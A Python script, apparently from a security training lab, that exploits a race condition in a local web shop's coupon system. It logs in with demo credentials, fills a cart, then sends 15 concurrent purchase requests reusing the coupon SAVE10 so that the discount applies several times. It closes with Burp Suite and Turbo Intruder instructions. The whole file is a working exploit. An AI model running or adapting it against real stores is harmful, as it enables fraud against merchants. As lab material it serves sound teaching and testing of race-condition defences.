#!/usr/bin/env python3
"""
Race Condition Vulnerability Test for Coupon Application
========================================================

This script demonstrates how to exploit the race condition vulnerability 
in the coupon application system using concurrent requests.

Usage:
1. Add items to cart
2. Capture the purchase request with coupon (Burp Suite/ZAP)
3. Use this script or Turbo Intruder to send concurrent requests
4. Observe multiple coupon applications in single purchase

Author: Security Research Lab
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

class CouponRaceConditionExploit:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login(self, username="john_doe", password="password123"):
        """Login to get session cookies"""
        print(f"üîë Logging in as {username}...")
        
        # Get login page first to establish session
        response = self.session.get(f"{self.base_url}/login")
        if response.status_code != 200:
            print(f"‚ùå Failed to access login page: {response.status_code}")
            return False
            
        # Login with credentials
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(f"{self.base_url}/login", data=login_data)
        if "dashboard" in response.url or response.status_code == 302:
            print("‚úÖ Login successful")
            return True
        else:
            print("‚ùå Login failed")
            return False
            
    def add_to_cart(self, product_id=1, quantity=2):
        """Add items to cart"""
        print(f"üõí Adding {quantity}x Product {product_id} to cart...")
        
        cart_data = {
            'product_id': product_id,
            'quantity': quantity
        }
        
        response = self.session.post(f"{self.base_url}/add_to_cart", data=cart_data)
        if response.status_code in [200, 302]:
            print("‚úÖ Item added to cart")
            return True
        else:
            print(f"‚ùå Failed to add to cart: {response.status_code}")
            return False
    
    def get_wallet_balance(self):
        """Check current wallet balance"""
        response = self.session.get(f"{self.base_url}/dashboard")
        # You could parse the HTML to extract balance, but for demo we'll skip
        return response.status_code == 200
        
    def exploit_coupon_race_condition(self, coupon_code="SAVE10", num_threads=10):
        """
        Exploit race condition by sending multiple concurrent purchase requests
        with the same coupon code
        """
        print(f"\nüéØ Starting race condition exploit with {num_threads} concurrent requests...")
        print(f"üè∑Ô∏è  Coupon code: {coupon_code}")
        print(f"‚è±Ô∏è  Exploiting 100ms race condition window...")
        
        # Purchase request data
        purchase_data = {
            'coupon_code': coupon_code
        }
        
        results = []
        start_time = time.time()
        
        def send_purchase_request(thread_id):
            """Send a single purchase request"""
            try:
                # Create new session for each thread to avoid cookie conflicts
                thread_session = requests.Session()
                # Copy cookies from main session
                thread_session.cookies.update(self.session.cookies)
                
                response = thread_session.post(f"{self.base_url}/purchase", 
                                             data=purchase_data, 
                                             allow_redirects=False)
                
                return {
                    'thread_id': thread_id,
                    'status_code': response.status_code,
                    'response_time': time.time() - start_time,
                    'headers': dict(response.headers),
                    'success': response.status_code in [200, 302]
                }
            except Exception as e:
                return {
                    'thread_id': thread_id,
                    'error': str(e),
                    'success': False
                }
        
        # Use ThreadPoolExecutor for concurrent requests
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # Submit all requests simultaneously
            future_to_thread = {
                executor.submit(send_purchase_request, i): i 
                for i in range(num_threads)
            }
            
            # Collect results
            for future in as_completed(future_to_thread):
                result = future.result()
                results.append(result)
                
                status = "‚úÖ" if result.get('success') else "‚ùå"
                thread_id = result.get('thread_id', '?')
                
                if 'error' in result:
                    print(f"{status} Thread {thread_id}: ERROR - {result['error']}")
                else:
                    status_code = result.get('status_code', 'unknown')
                    response_time = result.get('response_time', 0)
                    print(f"{status} Thread {thread_id}: HTTP {status_code} ({response_time:.3f}s)")
        
        # Analyze results
        successful_requests = [r for r in results if r.get('success')]
        print(f"\nüìä Race Condition Results:")
        print(f"   Total requests sent: {num_threads}")
        print(f"   Successful requests: {len(successful_requests)}")
        print(f"   Failed requests: {num_threads - len(successful_requests)}")
        
        if len(successful_requests) > 1:
            print(f"üö® RACE CONDITION EXPLOITED!")
            print(f"   Multiple coupon applications likely occurred!")
            print(f"   Expected: 1 coupon application")
            print(f"   Actual: {len(successful_requests)} requests succeeded")
        
        return results

def main():
    print("üéØ Coupon Race Condition Exploit Tool")
    print("="*50)
    
    exploit = CouponRaceConditionExploit()
    
    # Step 1: Login
    if not exploit.login():
        print("‚ùå Cannot proceed without successful login")
        return
    
    # Step 2: Add items to cart
    if not exploit.add_to_cart(product_id=1, quantity=2):
        print("‚ùå Cannot proceed without items in cart")
        return
    
    # Step 3: Exploit race condition
    results = exploit.exploit_coupon_race_condition(coupon_code="SAVE10", num_threads=15)
    
    print("\n" + "="*50)
    print("üîç Manual Testing Instructions:")
    print("1. Open Burp Suite or ZAP")
    print("2. Intercept POST request to /purchase with coupon_code=SAVE10")
    print("3. Send to Turbo Intruder with this payload:")
    print("   - Use 10-20 concurrent threads")
    print("   - Race condition window is 100ms")
    print("4. Check wallet transactions for multiple coupon applications")
    print("="*50)

if __name__ == "__main__":
    main()
